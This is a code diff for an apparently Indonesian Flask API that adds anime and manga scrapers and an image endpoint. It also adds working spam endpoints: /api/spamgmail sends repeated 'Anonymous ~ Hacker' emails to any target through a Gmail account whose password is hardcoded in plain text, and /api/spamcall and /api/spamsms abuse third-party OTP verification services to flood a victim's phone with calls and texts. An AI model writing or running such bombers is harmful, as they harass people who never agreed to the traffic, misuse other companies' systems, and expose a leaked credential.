@@ -1,15 +1,17 @@
 #from lib.pytube import YouTube
 from lib.dewa import cari
-from lib.kuso import kuso
+from lib.anime import *
 from lib.brainly import *
+from lib.manga import *
 from lib.resize import *
 from lib.search import *
+from lib.nulis import *
 from urllib.parse import *
 from flask import *
 #from werkzeug.utils import *
 from bs4 import BeautifulSoup as bs
 from requests import get, post
-import os, math, json, random, re, html_text, pytesseract, base64, time
+import os, math, json, random, re, html_text, pytesseract, base64, time, smtplib
 
 ua_ig = 'Mozilla/5.0 (Linux; Android 9; SM-A102U Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36 Instagram 155.0.0.37.107 Android (28/9; 320dpi; 720x1468; samsung; SM-A102U; a10e; exynos7885; en_US; 239490550)'
 
@@ -37,31 +39,170 @@ def convert_size(size_bytes):
 def sendTts(filename):
 	return send_from_directory(app.config['MEDIA'], filename, as_attachment=True)
 
-#@app.route('/api/layer', methods=['GET','POST'])
-#def layer():
-#	if request.args.get('base64image'):
-#		try:
-#			open('piw.jpg','wb').write(base64.b64decode(request.args.get('base64image')))
-#			time.sleep(0.4)
-#			hehe = resizeTo('piw.jpg')
-#			huhu = layer(hehe, 'black')
-#			return {
-#				'status': 200,
-#				'result': '`data:image/jpg;base64,%s`' % base64.b64encode(open('result.jpg','rb'))
-#			}
-#		except Exception as e:
-#			print(e)
-#			#os.remove('piw.jpg')
-#			return {
-#				'status': False,
-#				'error': '[!] Invalid base64 image!'
-#			}
-#	else:
-#		return {
-#			'status': False,
-#			'msg': '[!] Masukkan parameter base64image'
-#		}
+@app.route('/api/layer', methods=['GET','POST'])
+def layer():
+	if request.args.get('base64image'):
+		try:
+			open('piw.jpg','w').write(request.args.get('base64image'))
+			os.system('base64 -i -d piw.jpg > paw.jpg')
+			hehe = resizeTo('paw.jpg')
+			huhu = layer(hehe, 'black')
+			os.system('base64 result.jpg > pow.jpg')
+			return {
+				'status': 200,
+				'result': '`data:image/jpg;base64,%s`' % open('pow.jpg').read()
+			}
+		except Exception as e:
+			print(e)
+			#os.remove('piw.jpg')
+			return {
+				'status': False,
+				'error': '[!] Invalid base64 image!'
+			}
+	else:
+		return {
+			'status': False,
+			'msg': '[!] Masukkan parameter base64image'
+		}
 
+@app.route('/api/spamgmail', methods=['GET','POST'])
+def spamgimel():
+    if request.args.get('target'):
+        if request.args.get('jum'):
+            abece = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
+            target_imel = request.args.get('target')
+            jumlah = int(request.args.get('jum'))
+            if jumlah > 10:
+                return {
+                    'status': False,
+                    'msg': '[!] Max 10 tod!'
+                }
+            try:
+                server = smtplib.SMTP('smtp.gmail.com', 587)
+                server.ehlo()
+                server.starttls()
+                server.login('spamz.barbar@gmail.com', 'Barbar05')
+                hasil = ''
+                for i in range(jumlah):
+                    mess = ''.join(random.choice(abece) for _ in range(4))
+                    msg = f'From: {random.randint(1, 100)}<Hacker>\nSubject: Anonymous ~ Hacker\n{mess}'
+                    server.sendmail('spamz.barbar@gmail.com', target_imel, msg)
+                    hasil += '[!] Sukses\n'
+                server.quit()
+                return {
+                    'status': 200,
+                    'logs': hasil
+                }
+            except Exception as e:
+                print(e)
+                hasil = '[!] Gagal'
+                return {
+                    'status': False,
+                    'logs': hasil
+                }
+        else:
+            return {
+                'status': False,
+                'msg': 'Masukkan parameter jum'
+            }
+    else:
+        return {
+            'status': False,
+            'msg': 'Masukkan parameter target'
+        }
+
+@app.route('/api/spamcall', methods=['GET','POST'])
+def spamcall():
+    if request.args.get('no'):
+        no = request.args.get('no')
+        if str(no).startswith('8'):
+            hasil = ''
+            kyaa = post('https://id.jagreward.com/member/verify-mobile/%s' % no).json()
+            print(kyaa['message'])
+            if 'Anda akan menerima' in kyaa['message']:
+                hasil += '[!] Berhasil mengirim spam call ke nomor : 62%s' % no
+            else:
+                hasil += '[!] Gagal mengirim spam call ke nomor : 62%s' % no
+            return {
+                'status': 200,
+                'logs': hasil
+            }
+        else:
+            return {
+                'status': False,
+                'msg': '[!] Tolong masukkan nomor dengan awalan 8'
+            }
+    else:
+        return {
+            'status': False,
+            'msg': '[!] Masukkan parameter no' 
+        }
+@app.route('/api/spamsms', methods=['GET','POST'])
+def spamming():
+    if request.args.get('no'):
+        if request.args.get('jum'):
+            no = request.args.get('no')
+            jum = int(request.args.get('jum'))
+            if jum > 20: return {
+                'status': 200,
+                'msg': '[!] Max 20 ganteng'
+            }
+            url = 'https://www.lpoint.co.id/app/member/ESYMBRJOTPSEND.do'
+            head = {'UserAgent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1853) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36'}
+            data = {'pn': '',
+                'bird': '',
+                'webMbrId': '',
+                'webPwd': '',
+                'maFemDvC': '',
+                'cellNo': no,
+                'otpNo': '',
+                'seq': '',
+                'otpChk': 'N',
+                'count': ''
+            }
+            hasil = ''
+            for i in range(jum):
+                kyaa = post(url, headers=head, data=data).text
+                if 'error' in kyaa:
+                    hasil += '[!] Gagal\n'
+                else:
+                    hasil += '[!] Sukses\n'
+            return {
+                'status': 200,
+                'logs': hasil
+            }
+        else:
+            return {
+                'status': False,
+                'msg': '[!] Masukkin parameter jum juga ganteng'
+            }
+    else:
+        return {
+            'status': False,
+            'msg': '[!] Masukkan parameter no'
+        }
+
+@app.route('/nulis', methods=['GET','POST'])
+def noolees():
+    if request.args.get('text'):
+        try:
+            nulis = tulis(unquote(request.args.get('text')))
+            for i in nulis:
+                i.save('resolt.jpg')
+            return {
+                'status': 200,
+                'result': imageToBase64('resolt.jpg')
+            }
+        except:
+            return {
+                'status': False,
+                'error': 'Failed writing dude:('
+            }
+    else:
+        return {
+            'status': False,
+            'msg': '[!] Masukkan parameter text'
+        }
 @app.route('/api/wiki', methods=['GET','POST'])
 def wikipedia():
 	if request.args.get('q'):
@@ -224,7 +365,7 @@ def dewabatch():
 	if request.args.get('q'):
 		try:
 			q = request.args.get('q')
-			he=search_dewa(quote(q))
+			he=search_dewabatch(quote(q))
 			dewabatch=cari(he)
 			if he != '':
 				return {
@@ -245,21 +386,49 @@ def dewabatch():
 			'msg': '[!] Masukkan parameter q'
 		}
 
+@app.route('/api/komiku', methods=['GET','POST'])
+def komiku():
+    if request.args.get('q'):
+        try:
+            q = request.args.get('q')
+            komi = search_komiku(q)
+            if 'Tidak di temukan' not in komi:
+                manga = scrap_komiku(komi)
+                return {
+                    'status': 200,
+                    'info': manga['info'],
+                    'genre': manga['genre'],
+                    'sinopsis': manga['sinopsis'],
+                    'thumb': manga['thumb'],
+                    'link_dl': manga['dl_link']
+                }
+        except Exception as e:
+            print(e)
+            return {
+                'status': False,
+                'error': 'Manga %s Tidak di temukan' % unquote(q)
+            }
+    else:
+        return {
+            'status': False,
+            'msg': '[!] Masukkan parameter q'
+        }
+
 @app.route('/api/kuso', methods=['GET','POST'])
 def kusonime():
 	if request.args.get('q'):
 		try:
 			q = request.args.get('q')
-			he=search_kuso(quote(q))
-			kusonime=kuso(he)
-			print(kusonime)
+			he=search_kusonime(quote(q))
+			kuso=scrap_kusonime(he)
 			if he != '':
 				return {
 					'status': 200,
-					'sinopsis': kusonime['sinopsis'],
-					'thumb': kusonime['thumb'],
-					'info': kusonime['info'],
-					'title': kusonime['title']
+					'sinopsis': kuso['sinopsis'],
+					'thumb': kuso['thumb'],
+					'info': kuso['info'],
+					'title': kuso['title'],
+					'link_dl': kuso['link_dl']
 				}
 		except Exception as e:
 			print(e)
@@ -273,6 +442,33 @@ def kusonime():
 			'msg': '[!] Masukkan parameter q'
 		}
 
+@app.route('/api/otakudesu')
+def otakudesuu():
+    if request.args.get('q'):
+        try:
+            q = request.args.get('q')
+            he=search_otakudesu(quote(q))
+            if he != '':
+                otaku=scrap_otakudesu(he)
+                return {
+                    'status': 200,
+                    'sinopsis': otaku['sinopsis'],
+                    'thumb': otaku['thumb'],
+                    'info': otaku['info'],
+                    'title': otaku['title']
+                }
+        except Exception as e:
+            print(e)
+            return {
+                'status': False,
+                'error': 'Anime %s Tidak di temukan' % unquote(q)
+            }
+    else:
+        return {
+            'status': False,
+            'msg': '[!] Masukkan parameter q'
+        }
+            
 @app.route('/api/brainly', methods=['GET','POST'])
 def brainly_scraper():
 	if request.args.get('q'):
